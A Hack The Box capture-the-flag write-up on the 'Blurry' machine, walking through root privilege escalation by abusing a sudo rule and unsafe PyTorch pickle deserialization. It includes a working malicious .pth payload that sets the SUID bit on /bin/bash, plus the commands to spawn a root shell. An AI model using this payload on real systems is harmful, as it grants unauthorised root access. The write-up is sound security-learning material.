# Hack The Box Writeup: Blurry

**Difficulty:** Medium  
**OS:** Linux  
**Platform:** Hack The Box  
**Target IP:** `10.129.x.x`  
**Attack Path:** ClearML RCE (CVE-2024-24590) → User Access (`jippity`) → Sudo Misconfiguration → PyTorch Pickle Deserialization → SUID Bash → Root

---

## 1. Privilege Escalation Enumeration

After obtaining an initial foothold as `jippity` through a ClearML Remote Code Execution vulnerability (CVE-2024-24590), I began enumerating the system for potential privilege escalation vectors.

The first step was checking the user's sudo privileges:

```bash
sudo -l
```

The output revealed the following rule:

```text
User jippity may run the following commands on blurry:
    (root) NOPASSWD: /usr/bin/evaluate_model /models/*.pth
```

This meant that `jippity` could execute `/usr/bin/evaluate_model` as root without a password, provided the supplied model file matched the specified path pattern.

---

## 2. Analyzing the Target Script

Before exploiting the sudo rule, I inspected the script to understand how it processed model files.

```bash
cat /usr/bin/evaluate_model
```

The script performed the following operations:

- Accepted a `.pth` file as an argument.
- Checked the file type using `file --brief`.
- Extracted ZIP or TAR archives into `/opt/temp`.
- Searched the extracted contents for `.pkl` or pickle-related files.
- Used `fickling` to perform static analysis on the pickle files.
- Deleted files flagged as `OVERTLY_MALICIOUS`.
- If the file passed the checks, executed `/models/evaluate_model.py` as root with the supplied model.

### Identifying the Weakness

The script relied on `fickling` to detect malicious pickle payloads. However, static analysis alone cannot reliably prevent arbitrary code execution during unsafe deserialization.

By crafting a PyTorch model archive containing a malicious pickle payload, it was possible to bypass the validation mechanism and execute code when the model was loaded.

---

## 3. Identifying the Vulnerable Python Script

I inspected the Python script responsible for evaluating the model:

```bash
cat /models/evaluate_model.py
```

The script used:

```python
torch.load(model_path)
```

The `torch.load()` call did not use the safer `weights_only=True` option.

This was significant because PyTorch model files can contain serialized Python objects. During pickle deserialization, an object's `__reduce__` method can cause arbitrary code to execute.

Since the script was executed with root privileges through the sudo rule, successful code execution would also occur as root.

---

## 4. Crafting the Malicious Payload

I verified that `jippity` had write permissions to the `/models/` directory:

```bash
ls -la /models/
```

This allowed me to create a malicious `.pth` model file in the directory permitted by the sudo rule.

### Creating the Payload

I used Python and PyTorch to generate a serialized object whose `__reduce__` method would execute a command during deserialization.

The payload was designed to set the SUID bit on `/bin/bash`.

```python
import torch
import os

class EvilPayload:
    def __reduce__(self):
        return (os.system, ("chmod +s /bin/bash",))

fake_model = EvilPayload()

torch.save(fake_model, "/models/evil_zip.pth")

print("Payload created.")
```

### Verifying the File Type

I checked the generated file:

```bash
file /models/evil_zip.pth
```

The output identified it as a ZIP archive:

```text
Zip archive data, at least v0.0 to extract
```

This allowed it to pass the script's initial file type validation.

---

## 5. Executing the Exploit

I executed the model evaluation script using the sudo rule:

```bash
sudo /usr/bin/evaluate_model /models/evil_zip.pth
```

The script reported that the model was considered safe, but eventually returned an error:

```text
[+] Model /models/evil_zip.pth is considered safe. Processing...

Traceback (most recent call last):
    ...
TypeError: Expected state_dict to be dict-like, got <class 'int'>.
```

### Why the Exploit Worked

Although the script returned a `TypeError`, the payload had already executed.

The sequence was:

1. The malicious model passed the static analysis checks.
2. `torch.load()` deserialized the malicious object.
3. The object's `__reduce__` method executed the command.
4. `chmod +s /bin/bash` successfully set the SUID bit on Bash.
5. The script encountered a `TypeError` because the returned value was not a valid model state dictionary.

The error occurred after code execution, so it did not prevent the privilege escalation.

---

## 6. Getting Root

I verified that the SUID bit had been successfully set on `/bin/bash`:

```bash
ls -la /bin/bash
```

The output showed the SUID permission:

```text
-rwsr-xr-x 1 root root ... /bin/bash
```

I then spawned a privileged Bash shell:

```bash
bash -p
```

The `-p` option prevents Bash from dropping its elevated effective privileges.

I confirmed the privilege escalation:

```bash
id
```

Output:

```text
uid=1000(jippity) gid=1000(jippity) euid=0(root) egid=0(root) groups=0(root),1000(jippity)
```

Although the real UID remained `jippity`, the effective UID was `root`, confirming successful privilege escalation.

Finally, I retrieved the root flag:

```bash
cat /root/root.txt
```

---

## 7. Conclusion

Blurry demonstrated how a seemingly restricted sudo permission can lead to full system compromise when the executed application processes untrusted files unsafely.

The attack chain involved:

- **Initial Access:** Exploiting a ClearML RCE vulnerability (CVE-2024-24590) to obtain access as `jippity`.
- **Enumeration:** Discovering a sudo rule allowing root execution of `evaluate_model`.
- **Code Analysis:** Identifying unsafe PyTorch deserialization through `torch.load()`.
- **Security Bypass:** Passing a malicious serialized model through the static analysis checks.
- **Privilege Escalation:** Executing code as root to modify `/bin/bash` permissions and obtaining a privileged shell.

The key takeaway is that static analysis is not a substitute for safe deserialization. Loading untrusted PyTorch models without appropriate restrictions can result in arbitrary code execution, especially when the application is executed with elevated privileges.
